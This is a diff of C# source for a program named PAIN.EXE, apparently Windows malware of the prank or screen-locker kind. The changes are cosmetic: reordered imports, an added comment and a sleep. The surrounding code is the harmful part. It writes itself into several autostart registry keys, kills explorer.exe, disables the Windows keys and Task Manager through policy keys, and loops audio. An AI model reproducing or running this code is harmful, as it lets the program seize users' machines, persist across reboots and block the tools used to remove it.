@@ -1,14 +1,15 @@
-﻿using Microsoft.Win32;
-using System;
+﻿using System;
 using System.Diagnostics;
 using System.IO;
 using System.Media;
 using System.Reflection;
 using System.Windows.Forms;
-using PAIN.EXE.Properties;
 using System.Threading;
 using System.Drawing;
 using System.ComponentModel;
+using Microsoft.Win32;
+using PAIN.EXE.Properties;
+#pragma warning disable IDE1006
 namespace PAIN.EXE {
     #region Display()
     public partial class Form1 : Form {
@@ -27,7 +28,7 @@ namespace PAIN.EXE {
             SuspendLayout();
             timer1 = new System.Windows.Forms.Timer(components) {
                 Enabled = true,
-                Interval = 50 //Standard: 100
+                Interval = 50 //Standard: 100, Value in milliseconds
             };
             timer1.Tick += new EventHandler(timer1_Tick);
             AutoScaleMode = AutoScaleMode.Font;
@@ -91,7 +92,6 @@ namespace PAIN.EXE {
             RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "PainTemp", TMPath, RegistryValueKind.String);
             RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "PainTemp", TMPath, RegistryValueKind.String);
             RefreshReg(@"SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Windows\load", "PainTemp", TMPath, RegistryValueKind.String);
-
             new Process { StartInfo = new ProcessStartInfo { FileName = "cmd.exe", Arguments = "/c \"taskkill /f /im explorer.exe\"", CreateNoWindow = false, WindowStyle = ProcessWindowStyle.Minimized } }.Start();
             RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWinKeys", 1, RegistryValueKind.DWord);
             RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1, RegistryValueKind.DWord);
@@ -102,8 +102,7 @@ namespace PAIN.EXE {
                 Environment.Exit(0);
             #endregion
             #region Start()
-            Thread t = new Thread(new ThreadStart(Audio));
-            t.Start();
+            new Thread(new ThreadStart(Audio)).Start();
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             while (true)
@@ -133,6 +132,7 @@ namespace PAIN.EXE {
                 }
                 soundPlayer = new SoundPlayer(Resources.hava_nagila);
                 soundPlayer.Play();
+                Thread.Sleep(1000);
             }
             #endregion
         }
